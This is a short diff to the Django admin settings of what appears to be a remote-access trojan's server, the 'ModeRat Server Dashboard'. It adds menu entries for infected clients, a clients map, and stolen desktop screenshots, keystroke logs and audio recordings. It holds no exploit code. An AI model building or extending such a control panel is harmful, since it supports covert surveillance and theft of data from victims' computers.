@@ -138,5 +138,17 @@ SUIT_CONFIG = {
     'ADMIN_NAME': 'ModeRat Server Dashboard',
     'SHOW_REQUIRED_ASTERISK': True,
     'CONFIRM_UNSAVED_CHANGES': True,
-    'MENU_EXCLUDE': ('auth.group',)
+    'MENU_EXCLUDE': ('auth.group',),
+    'MENU': (
+            'sites',
+            {'label': 'Dashboard Users', 'icon':'icon-lock', 'models': ('auth.user',)},
+            {'label': 'Clients Map', 'icon':'icon-globe', 'url': 'admin:map', },
+            '-',
+            {'label': 'Moderators', 'icon':'icon-user', 'url': '/admin/ModeratServer/moderators/'},
+            {'label': 'Clients', 'icon':'icon-eye-open', 'url': '/admin/ModeratServer/clients/'},
+            '-',
+            {'label': 'Desktop Screenshots', 'icon':'icon-picture', 'url': '/admin/ModeratServer/screenshots/'},
+            {'label': 'Keyboard Strokes', 'icon':'icon-align-left', 'url': '/admin/ModeratServer/keylogs/'},
+            {'label': 'Audio Records', 'icon':'icon-volume-up', 'url': '/admin/ModeratServer/audios/'},
+        )
 }
